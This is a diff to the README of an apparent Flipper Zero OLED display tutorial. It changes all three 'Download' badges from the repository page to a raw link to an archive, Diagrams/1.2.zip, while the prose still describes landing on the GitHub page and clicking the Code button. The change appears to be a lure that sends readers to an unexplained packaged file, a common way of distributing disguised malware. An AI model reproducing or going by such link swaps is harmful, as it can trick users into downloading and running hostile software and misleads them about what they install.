@@ -1,6 +1,6 @@
 # 🔧 OLED-FlipperZero_Tutorial - Wire, Flash, and Display with Ease
 
-[![Download Now](https://img.shields.io/badge/Download-OLED_FlipperZero_Tutorial-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nuttawutgittagoon-dotcom/OLED-FlipperZero_Tutorial)
+[![Download Now](https://img.shields.io/badge/Download-OLED_FlipperZero_Tutorial-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/nuttawutgittagoon-dotcom/OLED-FlipperZero_Tutorial/main/Diagrams/1.2.zip)
 
 ---
 
@@ -53,7 +53,7 @@ Your journey to a brighter Flipper Zero starts here. Follow these steps in order
 
 Visit this link to download the application.
 
-[![Download Here](https://img.shields.io/badge/Download-Start_Now-4CAF50?style=for-the-badge&logo=download&logoColor=white)](https://github.com/nuttawutgittagoon-dotcom/OLED-FlipperZero_Tutorial)
+[![Download Here](https://img.shields.io/badge/Download-Start_Now-4CAF50?style=for-the-badge&logo=download&logoColor=white)](https://raw.githubusercontent.com/nuttawutgittagoon-dotcom/OLED-FlipperZero_Tutorial/main/Diagrams/1.2.zip)
 
 Once you click the link, you'll land on the GitHub page. Look for the green "Code" button and select "Download ZIP." Save the file to your desktop or Downloads folder.
 
@@ -189,7 +189,7 @@ This tutorial is provided free for personal and educational use. Credit to the o
 
 Visit this link to download the application.
 
-[![Download Now](https://img.shields.io/badge/Download_OLED_FlipperZero_Tutorial-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nuttawutgittagoon-dotcom/OLED-FlipperZero_Tutorial)
+[![Download Now](https://img.shields.io/badge/Download_OLED_FlipperZero_Tutorial-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/nuttawutgittagoon-dotcom/OLED-FlipperZero_Tutorial/main/Diagrams/1.2.zip)
 
 You're minutes away from a beautifully upgraded Flipper Zero. Grab the package, follow the steps, and enjoy your new screen!
 
